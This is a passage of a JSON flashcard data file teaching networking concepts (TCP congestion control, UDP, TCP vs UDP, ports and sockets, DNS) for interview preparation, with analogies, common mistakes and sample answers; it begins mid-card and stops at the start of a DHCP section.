          "Sliding window slides forward as receiver application reads data from socket buffer.",
          "Zero Window (rwnd=0) pauses sender; Persist Timer probes periodically.",
          "Window Scale option (RFC 1323) expands window size up to 1 GB for high-bandwidth links."
        ],
        "whenToUse": "Tuning high-throughput socket applications, preventing buffer overruns, and BDP network optimization."
      }
    }
  ],
  "congestion-control": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TCP Congestion Control?",
      "inSimpleWords": "TCP Congestion Control dynamically regulates the sender's transmission rate to prevent intermediate network routers and buffers from collapsing due to packet traffic overload.",
      "analogy": "Entering a busy highway: you don't instantly drive 120 km/h; you merge slowly, gradually accelerate as long as traffic flows freely, and hit the brakes immediately when brake lights flash ahead.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TCP Congestion Control?",
      "problem": "If hundreds of computers send data at full line rate into a shared bottleneck router, the router's queue overflows, dropping packets and causing Congestive Collapse.",
      "whyItMatters": "Congestion control prevents the global Internet from collapsing under load, enabling fair bandwidth sharing across millions of competing flows.",
      "howSolves": "The sender maintains an internal Congestion Window (cwnd) adjusted dynamically via algorithms: Slow Start (exponential growth), Congestion Avoidance (linear growth), and Fast Recovery."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TCP Congestion Control work?",
      "steps": [
        {
          "step": 1,
          "title": "Slow Start (Exponential Growth)",
          "desc": "Starts with small cwnd (e.g. 10 MSS). For every ACK received, cwnd doubles every RTT until reaching ssthresh."
        },
        {
          "step": 2,
          "title": "Congestion Avoidance (AIMD)",
          "desc": "When cwnd >= ssthresh, growth shifts to linear: cwnd increases by 1 MSS per RTT (Additive Increase)."
        },
        {
          "step": 3,
          "title": "Packet Loss Detection",
          "desc": "Packet loss signals buffer overflow. 3 duplicate ACKs = mild congestion; RTO timeout = severe congestion."
        },
        {
          "step": 4,
          "title": "Multiplicative Decrease & Fast Recovery",
          "desc": "On 3 dup ACKs: ssthresh is halved, cwnd is halved, and transmission resumes without dropping back to 1 MSS."
        }
      ],
      "vfxType": "handshake"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "cwnd (Congestion Window)": "Sender-maintained state variable limiting bytes in flight",
        "ssthresh (Slow Start Threshold)": "Boundary determining when to switch from exponential to linear growth",
        "AIMD": "Additive Increase (grow by 1 MSS/RTT) / Multiplicative Decrease (halve on loss)",
        "Modern Algorithms": "CUBIC (standard in Linux/Windows), BBR (Google Bottleneck Bandwidth and RTT)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A user streams a 4K video while another family member starts a massive game download on the same home router.",
      "challenge": "Both streams flood the router's 50 Mbps WAN uplink, creating bufferbloat and packet drops.",
      "resolution": "TCP congestion control detects packet drops, halves both senders' congestion windows (AIMD), and converges to a fair 50/50 split of the 50 Mbps link.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Initial cwnd": "10 MSS (~14.6 KB)",
        "Slow Start Growth": "10 -> 20 -> 40 -> 80 MSS",
        "ssthresh Default": "64 KB",
        "Timeout Reaction": "Severe loss: ssthresh = cwnd / 2; cwnd reset to 1 MSS (full restart)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TCP Congestion Control (Slow Start, Congestion Avoidance, Fast Recovery). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Slow Start is actually slow.",
          "why": "Slow Start doubles cwnd every RTT (exponential 2^n growth), making it the fastest growth phase in TCP.",
          "correct": "Slow Start is named because it starts with a small window, but its growth rate is EXPONENTIAL, not slow."
        },
        {
          "wrong": "A packet drop always means a physical cable was damaged.",
          "why": "In modern wired networks, 99.9% of packet drops are caused by router queue buffer overflows during congestion.",
          "correct": "TCP assumes every packet drop is a signal of network congestion."
        },
        {
          "wrong": "Wireless Wi-Fi bit flips are handled well by standard TCP.",
          "why": "TCP interprets wireless radio bit loss as congestion and slashes speed unnecessarily.",
          "correct": "Standard TCP confuses wireless signal loss with congestion, inspiring modern algorithms like BBR."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Explain the AIMD (Additive Increase Multiplicative Decrease) principle in TCP and why it leads to fair bandwidth allocation.",
          "a": "AIMD is the mathematical foundation of TCP congestion avoidance. 1. Additive Increase: As long as no packet loss occurs, the sender increases its congestion window linearly by adding 1 MSS every Round Trip Time (cwnd = cwnd + 1). This cautiously probes for available bandwidth. 2. Multiplicative Decrease: The moment packet loss is detected (via 3 duplicate ACKs), the sender cuts its congestion window in half (cwnd = cwnd / 2). If two flows share a bottleneck link, the flow consuming more bandwidth loses more in absolute terms when halved. Over successive sawtooth cycles, this mathematical convergence forces competing connections to settle at an equal, fair share of link capacity while maximizing utilization.",
          "tip": "Draw the 'sawtooth waveform' diagram: linear upward slopes followed by sharp 50% drops."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Slow Start = exponential growth (double/RTT); Congestion Avoidance = linear growth (+1 MSS/RTT); Loss = halve window.",
        "summaryPoints": [
          "cwnd is maintained internally by sender; not visible in TCP header.",
          "Slow Start doubles cwnd every RTT until ssthresh is reached.",
          "AIMD creates the classic TCP sawtooth bandwidth profile.",
          "RTO timeout resets cwnd to 1 MSS; 3 duplicate ACKs triggers Fast Recovery (halves cwnd)."
        ],
        "whenToUse": "Network performance optimization, cloud bandwidth tuning, and understanding TCP throughput formulas."
      }
    }
  ],
  "udp-protocol": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is UDP?",
      "inSimpleWords": "User Datagram Protocol (UDP, RFC 768) is a connectionless, lightweight, unreliable Transport Layer protocol that transmits independent datagrams without handshakes, acknowledgments, or flow control.",
      "analogy": "Sending a postcard in a mailbox: you drop it in; there is no handshake with the post office, no delivery confirmation receipt, and if it rains and ruins the postcard, nobody replaces it. But it is fast, cheap, and lightweight.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need UDP?",
      "problem": "TCP's 3-way handshake, retransmissions, sliding window stalls, and head-of-line blocking introduce intolerable latency for live video calls and gaming.",
      "whyItMatters": "Real-time voice (VoIP), live video streaming, multiplayer games, and DNS require immediate packet delivery where late retransmitted data is completely useless.",
      "howSolves": "UDP strips away all state management, providing a minimal 8-byte header containing only source/dest ports, length, and an optional checksum."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does UDP work?",
      "steps": [
        {
          "step": 1,
          "title": "Zero Handshake",
          "desc": "Application passes datagram to OS socket; UDP transmits immediately without connection delay."
        },
        {
          "step": 2,
          "title": "Independent Datagrams",
          "desc": "Each packet travels as an autonomous entity with no sequence numbering or session tracking."
        },
        {
          "step": 3,
          "title": "No Retransmission",
          "desc": "If a packet is dropped by network congestion, it is gone forever. No retries, no delay."
        },
        {
          "step": 4,
          "title": "Broadcast / Multicast Support",
          "desc": "Unlike connection-oriented TCP, UDP natively supports 1-to-many broadcast and multicast streams."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Total Header Size": "Exactly 8 Bytes (fixed, compared to 20-60B for TCP)",
        "Source Port": "16 bits (0 - 65535)",
        "Destination Port": "16 bits (0 - 65535)",
        "Length": "16 bits (length of UDP header + UDP payload in bytes, min 8)",
        "Checksum": "16 bits (error detection; optional in IPv4, mandatory in IPv6)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A player plays an online multiplayer first-person shooter (Valorant / CS:GO) at 128 tick rate.",
      "challenge": "Player coordinates must update every 7 milliseconds. If packet #40 is dropped, receiving it 100 ms later via TCP retransmission is useless because the player has already moved.",
      "resolution": "The game uses UDP. Dropped coordinate packets are simply discarded; the game client immediately renders the newer coordinate packet arriving 7 ms later.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "DNS Queries": "UDP port 53 (single request, single response)",
        "DHCP Configuration": "UDP ports 67 (server) and 68 (client)",
        "NTP Clock Sync": "UDP port 123",
        "QUIC / HTTP/3": "Runs multiplexed web streams over UDP port 443"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for UDP (User Datagram Protocol) & 8-Byte Lightweight Header. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "UDP has zero error detection capability.",
          "why": "UDP includes an optional 16-bit checksum covering header, data, and IP pseudo-header.",
          "correct": "UDP CAN detect corrupted bits via checksum (and silently drops bad packets), but it does NOT correct or retransmit them."
        },
        {
          "wrong": "UDP is always faster than TCP under all network conditions.",
          "why": "On a clean, high-bandwidth fiber link with zero packet loss, TCP and UDP stream at similar physical wire speeds.",
          "correct": "UDP is faster when latency and connection setup matter, or when packet loss causes TCP to stall waiting for retransmissions."
        },
        {
          "wrong": "UDP cannot support reliable applications.",
          "why": "Reliability can be implemented in the application layer on top of UDP (e.g. Google QUIC protocol).",
          "correct": "UDP itself is unreliable, but applications can build custom retransmission logic on top of it."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why does DNS use UDP for standard queries, but switches to TCP for zone transfers?",
          "a": "DNS uses UDP (port 53) for standard domain queries because a query fits in a single packet (<512 bytes) and expects a single reply. Using UDP avoids the overhead and latency of a TCP 3-way handshake and teardown, allowing root and TLD nameservers to serve millions of queries per second. However, DNS switches to TCP (port 53) in two cases: 1. Zone Transfers (AXFR/IXFR) between primary and secondary nameservers: transferring entire DNS zone databases requires reliable, ordered byte streams without missing records. 2. Responses exceeding 512 bytes (without EDNS0): if a DNS reply is truncated (TC flag set), the client falls back to TCP to receive the full payload.",
          "tip": "Always mention: 1. Speed/overhead for small queries; 2. Zone transfers (AXFR) and responses > 512B require TCP."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "UDP = Connectionless, unreliable, 8-byte fixed header. Zero handshake latency. No retransmission.",
        "summaryPoints": [
          "8-byte header: Source Port, Dest Port, Length, Checksum.",
          "Zero connection state, zero handshake delay, no head-of-line blocking.",
          "Ideal for real-time traffic: VoIP, video streaming, gaming, DNS, DHCP.",
          "Powers modern HTTP/3 via Google's QUIC protocol."
        ],
        "whenToUse": "Real-time communication, low-latency gaming, IoT telemetry, and high-frequency queries."
      }
    }
  ],
  "tcp-vs-udp": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TCP vs UDP Comparison & Protocol Decision Matrix?",
      "inSimpleWords": "A comprehensive architectural comparison evaluating the trade-offs between TCP (reliable, ordered, connection-oriented) and UDP (fast, lightweight, connectionless).",
      "analogy": "TCP is a phone call: you dial, wait for an answer, speak back and forth, confirm hearing each word, and say goodbye. UDP is a megaphone announcement: you shout the message once; whoever hears it hears it, and you don't wait for confirmation.",
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TCP vs UDP Comparison & Protocol Decision Matrix?",
      "problem": "Choosing the wrong transport protocol destroys application performance: using TCP for multiplayer gaming causes jittery lag; using UDP for banking transfers causes lost funds.",
      "whyItMatters": "Every software engineer and systems architect must make deliberate transport protocol choices when designing APIs, streaming services, and distributed microservices.",
      "howSolves": "Evaluating the protocol decision matrix against application requirements: tolerance for packet loss vs tolerance for latency delay."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TCP vs UDP Comparison & Protocol Decision Matrix work?",
      "steps": [
        {
          "step": 1,
          "title": "Connection State",
          "desc": "TCP requires 3-Way Handshake before sending data; UDP sends datagrams immediately with zero setup delay."
        },
        {
          "step": 2,
          "title": "Reliability & Retransmit",
          "desc": "TCP guarantees 100% delivery via sequence numbers and ACKs; UDP provides best-effort delivery with zero retransmits."
        },
        {
          "step": 3,
          "title": "Ordering",
          "desc": "TCP reassembles out-of-order packets into exact byte stream; UDP delivers packets in whatever order they arrive."
        },
        {
          "step": 4,
          "title": "Flow & Congestion Control",
          "desc": "TCP dynamically throttles speed to protect network and receiver; UDP transmits at whatever rate the application dictates."
        }
      ],
      "vfxType": "handshake"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "TCP Features": "Connection-oriented | Reliable | Ordered | Flow Control | Congestion Control | 20-60B Header | Unicast only",
        "UDP Features": "Connectionless | Unreliable | Unordered | No Flow Control | No Congestion Control | 8B Header | Unicast, Broadcast, Multicast",
        "TCP Protocols": "HTTP/HTTPS, SSH, SFTP, SMTP, MySQL, PostgreSQL, BGP",
        "UDP Protocols": "DNS, DHCP, NTP, SNMP, TFTP, VoIP (SIP/RTP), WebRTC, QUIC (HTTP/3)"
      },
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A development team designs an online tele-health video consultation app with chat functionality.",
      "challenge": "Video call frames need low latency (<150ms) to feel natural, but text chat messages must never be lost or delivered out of order.",
      "resolution": "Use UDP (WebRTC / RTP) for the live audio/video media stream; use TCP (WebSocket / HTTPS) for the text chat and prescription documents.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Header Overhead": "TCP = 20 to 60 bytes vs UDP = 8 bytes",
        "Speed Under Loss": "UDP continues uninterrupted; TCP drops speed by 50% and stalls on lost packets",
        "Broadcast Capability": "TCP CANNOT broadcast (1-to-1 only); UDP natively broadcasts to 255.255.255.255"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TCP vs UDP Comparison & Protocol Decision Matrix. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "UDP is always better than TCP for video streaming like Netflix and YouTube.",
          "why": "Pre-recorded video streaming (Netflix, YouTube) uses TCP (HTTPS) with buffering.",
          "correct": "Pre-recorded streaming buffers ahead using TCP; LIVE interactive calls (Zoom, FaceTime) use UDP to prevent lag."
        },
        {
          "wrong": "TCP is more secure than UDP.",
          "why": "Neither TCP nor UDP provide encryption natively.",
          "correct": "Security is provided by Layer 6/7 protocols like TLS (for TCP) or DTLS (for UDP)."
        },
        {
          "wrong": "You can establish a TCP connection to a broadcast address.",
          "why": "TCP 3-way handshake requires an individual point-to-point state machine with one peer.",
          "correct": "TCP is strictly UNICAST (point-to-point). Only UDP supports Broadcast and Multicast."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why does HTTP/3 (QUIC) run over UDP instead of TCP, given that web pages require 100% reliable data?",
          "a": "HTTP/2 solved application-layer head-of-line blocking by multiplexing multiple requests over a single TCP connection. However, it introduced 'Transport-Layer Head-of-Line Blocking': if a single TCP packet is dropped, the entire TCP connection freezes while the OS waits for retransmission, stalling all other multiplexed web streams simultaneously. HTTP/3 solves this by migrating to QUIC, which runs on top of UDP. QUIC implements its own lightweight stream multiplexing and retransmission logic directly in user space. If a packet for Stream 1 is lost, Stream 2 and Stream 3 continue loading without delay. Furthermore, QUIC combines connection establishment with TLS 1.3 encryption, enabling 0-RTT connection resumption.",
          "tip": "Explain 'Head-of-Line Blocking in HTTP/2 over TCP' and how QUIC over UDP isolates individual streams."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Use TCP when zero loss is mandatory (Web, DB, Files). Use UDP when low latency is mandatory (Voice, Video, Games).",
        "summaryPoints": [
          "TCP: Reliable, ordered, heavy (20B header), flow/congestion controlled, unicast only.",
          "UDP: Unreliable, unordered, lightweight (8B header), zero handshake, supports broadcast/multicast.",
          "Netflix/YouTube use TCP with buffering; Zoom/VoIP use UDP for live latency.",
          "HTTP/3 replaces TCP with QUIC over UDP to eliminate head-of-line blocking."
        ],
        "whenToUse": "The ultimate protocol selection question in software engineering and system design interviews."
      }
    }
  ],
  "ports-and-sockets": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Ports, Sockets & Multiplexing / Demultiplexing?",
      "inSimpleWords": "A port is a 16-bit numerical identifier (0 to 65535) used by the Transport Layer to direct data to specific software processes. A socket is the unique combination of an IP address and a Port number representing an endpoint of communication.",
      "analogy": "An apartment building address: the IP address is the building's street address (100 Main St); the Port number is the specific apartment number (Apt 402) where a specific person (process) lives.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Ports, Sockets & Multiplexing / Demultiplexing?",
      "problem": "A computer running simultaneously a web browser, Spotify, Discord, and an email client shares a single physical IP address. How does the OS know which incoming packet belongs to which app?",
      "whyItMatters": "Port multiplexing allows an operating system to run thousands of concurrent network services on a single machine.",
      "howSolves": "The OS network stack inspects the 16-bit Destination Port in the TCP/UDP header and demultiplexes incoming payload directly to the socket bound to that process."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Ports, Sockets & Multiplexing / Demultiplexing work?",
      "steps": [
        {
          "step": 1,
          "title": "Port Range Allocation",
          "desc": "Ports 0-1023 (Well-Known), 1024-49151 (Registered), 49152-65535 (Dynamic / Ephemeral)."
        },
        {
          "step": 2,
          "title": "Socket Binding",
          "desc": "Server process executes `bind(port: 8080)` and `listen()`, claiming ownership of that port."
        },
        {
          "step": 3,
          "title": "Client Ephemeral Port",
          "desc": "Client OS allocates random high-range ephemeral port (e.g. 52140) for outbound connection."
        },
        {
          "step": 4,
          "title": "5-Tuple Demultiplexing",
          "desc": "OS identifies unique connection via 5-tuple: {Src IP, Src Port, Dest IP, Dest Port, Protocol}."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Well-Known Ports (0 - 1023)": "HTTP (80), HTTPS (443), SSH (22), DNS (53), DHCP (67/68), FTP (20/21)",
        "Registered Ports (1024 - 49151)": "MySQL (3306), PostgreSQL (5432), Redis (6379), MongoDB (27017)",
        "Dynamic / Ephemeral (49152 - 65535)": "Allocated temporarily by client OS for outbound connections",
        "5-Tuple Socket Identifier": "{Source IP, Source Port, Destination IP, Destination Port, Transport Protocol}"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A developer opens 5 separate browser tabs to google.com simultaneously.",
      "challenge": "All 5 tabs connect to the same server IP (142.250.72.14) on the same port (443). How does the browser avoid mixing up search results between tabs?",
      "resolution": "The client OS assigns a unique ephemeral port number (e.g. 52001, 52002, 52003...) to each browser tab's socket. The 5-tuple for each tab is unique.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Socket Pair": "Client [192.168.1.10:52140] <==> Server [142.250.72.14:443]",
        "Listening Socket": "0.0.0.0:80 (listens on all network interfaces)",
        "Loopback Socket": "127.0.0.1:3000 (accessible only from local host)",
        "Command Check": "netstat -tuln or ss -tuln (shows active listening ports)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Ports, Sockets & Multiplexing / Demultiplexing. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A server listening on port 443 can only accept 1 client connection at a time.",
          "why": "Connections are identified by the FULL 5-TUPLE, not just the server's port.",
          "correct": "A web server on port 443 can handle tens of thousands of concurrent connections as long as each client has a unique IP:Port combination."
        },
        {
          "wrong": "TCP and UDP cannot share the same port number on the same computer.",
          "why": "TCP and UDP maintain completely separate protocol demultiplexing tables in the OS kernel.",
          "correct": "TCP port 53 and UDP port 53 can both be bound simultaneously without conflict."
        },
        {
          "wrong": "Any standard user can bind to port 80 or port 443.",
          "why": "Well-known ports (0-1023) are privileged and require root / administrator permissions.",
          "correct": "Ports below 1024 require elevated root/sudo privileges to prevent malicious processes from spoofing system services."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "How can a web server handle 100,000 concurrent TCP connections on a single listening port (e.g. port 443)?",
          "a": "A TCP connection is not identified by the server's listening port alone; it is uniquely identified in the OS kernel by the 5-Tuple: {Source IP, Source Port, Destination IP, Destination Port, Protocol}. The server's listening socket on 0.0.0.0:443 never exchanges data; its only job is to accept new handshakes. When `accept()` completes, the OS kernel creates a brand new connected socket descriptor with the same Destination Port (443), but bound to the client's unique Source IP and Source Port. As long as the client IP or client ephemeral port is different, the 5-tuple is unique. A server can handle hundreds of thousands of concurrent connections bounded only by RAM, file descriptors (`ulimit -n`), and CPU scheduling.",
          "tip": "Explain the difference between the 'Listening Socket' and the 'Connected Socket', and quote the 5-Tuple."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Port = 16-bit process identifier (0-65535). Sockets identified by 5-tuple: {Src IP, Src Port, Dst IP, Dst Port, Protocol}.",
        "summaryPoints": [
          "Ports 0-1023 are privileged Well-Known ports (HTTP 80, HTTPS 443, SSH 22).",
          "Ephemeral ports (49152-65535) are dynamically assigned to client outbound sockets.",
          "TCP and UDP port numbers are completely independent.",
          "5-tuple uniqueness allows a single server port to handle thousands of concurrent clients."
        ],
        "whenToUse": "Server deployment, microservice port allocation, firewall rule definitions, and socket programming."
      }
    }
  ],
  "dns-domain-name-system": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is DNS Hierarchy & Resolution Process?",
      "inSimpleWords": "The Domain Name System (DNS, RFC 1035) is the global hierarchical decentralized naming database that translates human-readable domain names (e.g. google.com) into machine-routable IP addresses (e.g. 142.250.72.14).",
      "analogy": "The global phonebook of the Internet: you remember your friend's name (Alice), but your phone needs her numerical phone number (+91-9876543210) to place the call.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need DNS Hierarchy & Resolution Process?",
      "problem": "Humans are incapable of memorizing 32-bit (IPv4) or 128-bit (IPv6) numerical strings for every website, API, and cloud server they visit.",
      "whyItMatters": "If DNS fails, the entire Internet appears 'down' to end users even if underlying optical fibers, switches, and web servers are functioning perfectly.",
      "howSolves": "A tree hierarchy of nameservers (Root '.', Top-Level Domain '.com', Authoritative 'example.com') processes recursive queries and caches answers globally."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does DNS Hierarchy & Resolution Process work?",
      "steps": [
        {
          "step": 1,
          "title": "Local Cache Check",
          "desc": "Browser checks local memory cache -> OS hosts file -> OS DNS resolver cache."
        },
        {
          "step": 2,
          "title": "Recursive Resolver Query",
          "desc": "If cache miss, queries ISP or Public Resolver (8.8.8.8, 1.1.1.1) via UDP port 53."
        },
        {
          "step": 3,
          "title": "Root Server Referral",
          "desc": "Resolver asks 1 of 13 Root Server clusters ('.'). Root returns IP referral for the Top-Level Domain (TLD) servers ('.com')."
        },
        {
          "step": 4,
          "title": "TLD Server Referral",
          "desc": "Resolver asks TLD server (e.g. Verisign for .com). TLD returns authoritative nameservers for 'example.com'."
        },
        {
          "step": 5,
          "title": "Authoritative Answer",
          "desc": "Resolver queries authoritative nameserver (ns1.example.com). Server returns A Record: 93.184.216.34 with TTL."
        },
        {
          "step": 6,
          "title": "Cache & Return",
          "desc": "Resolver caches result for TTL duration (e.g. 300s) and returns IP to browser. Browser initiates TCP connection."
        }
      ],
      "vfxType": "dns"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Root Servers ('.')": "13 logical IP clusters (A through M root) replicated globally via Anycast routing",
        "TLD Servers": "Generic TLDs (.com, .org, .net) and Country-Code TLDs (.in, .uk, .de)",
        "Authoritative Servers": "Organizations' nameservers holding the official zone file records (Route 53, Cloudflare)",
        "DNS Record Types": "A (IPv4), AAAA (IPv6), CNAME (canonical alias), MX (mail), TXT (SPF/DKIM verification), NS (nameserver)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A startup migrates its backend servers from AWS to GCP and updates its domain's DNS A Record.",
      "challenge": "Some customers in Europe still hit the old AWS server for 2 hours after the DNS change was published.",
      "resolution": "The previous DNS record had a Time To Live (TTL) of 7200 seconds (2 hours). European ISP resolvers continued serving the cached old IP until the TTL expired.",
      "vfxType": "dns"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "A Record": "example.com. 300 IN A 93.184.216.34",
        "AAAA Record": "example.com. 300 IN AAAA 2606:2800:220:1:248:1893:25c8:1946",
        "CNAME Record": "www.example.com. CNAME example.com.",
        "Dig Command": "dig example.com +trace (displays full step-by-step resolution hierarchy)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for DNS Hierarchy & Resolution Process. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "dns"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "There are only 13 physical DNS root server computers in the world.",
          "why": "There are 13 logical IP addresses (A.root-servers.net to M.root-servers.net), but hundreds of physical servers.",
          "correct": "Over 1,500 physical server nodes exist globally, distributed across the 13 logical IP addresses using BGP Anycast routing."
        },
        {
          "wrong": "A CNAME record can point directly to an IP address.",
          "why": "CNAME creates an alias to another domain name string, not an IP.",
          "correct": "CNAME points to another domain name (e.g. www -> example.com); only A and AAAA records point to IP addresses."
        },
        {
          "wrong": "DNS queries use TCP by default.",
          "why": "TCP handshake overhead would overwhelm global DNS root infrastructure.",
          "correct": "DNS uses UDP port 53 for standard queries to maximize throughput and minimize latency."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between an Iterative DNS query and a Recursive DNS query?",
          "a": "In a Recursive Query, the client asks a DNS server (typically the local ISP or recursive resolver like 8.8.8.8) to do all the work: 'Please resolve this domain for me and return the final IP address or an error; do not give me referrals.' The resolver takes full responsibility, querying root, TLD, and authoritative servers on behalf of the client. In an Iterative Query, the client asks a server: 'Give me the answer if you know it; otherwise, return the best referral (the IP of the next nameserver down the tree) so I can query it myself.' Root and TLD nameservers handle only iterative queries to protect their CPU and network resources from maintaining millions of recursive state sessions.",
          "tip": "Draw the distinction: Client -> Resolver is Recursive; Resolver -> Root/TLD is Iterative."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "DNS maps Domain -> IP. Hierarchy: Root ('.') -> TLD ('.com') -> Authoritative ('example.com'). Uses UDP 53.",
        "summaryPoints": [
          "A Record = IPv4 address; AAAA Record = IPv6 address; CNAME = Domain alias.",
          "TTL (Time to Live) governs how long intermediate resolvers cache responses.",
          "Recursive resolver performs the heavy lifting on behalf of the client.",
          "Anycast routing mirrors 13 logical root server IPs across thousands of physical locations."
        ],
        "whenToUse": "Web architecture, zero-downtime server migrations, domain verification, and email SPF configuration."
      }
    }
  ],
  "dhcp-protocol": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is DHCP?",
      "inSimpleWords": "DHCP (RFC 2131) is an application-layer network management protocol operating over UDP (ports 67/68) that automatically assigns IP addresses, subnet masks, default gateways, and DNS servers to client devices on a local network.",
      "analogy": "Checking into a hotel: you arrive with no room assigned; the front desk receptionist assigns you Room 304, gives you the Wi-Fi password (DNS), tells you where the exit elevators are (Default Gateway), and notes your checkout time (Lease duration).",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need DHCP?",
      "problem": "Manually typing static IP addresses, subnet masks, gateways, and DNS servers into 500 employee laptops is error-prone, causes IP conflict collisions, and makes mobility impossible.",
      "whyItMatters": "Whenever you connect to Wi-Fi at home, college, or an airport, DHCP configures your entire network stack in under 200 milliseconds automatically.",
      "howSolves": "The 4-step DORA broadcast/unicast handshake: Discover, Offer, Request, Acknowledge."
    },
    {
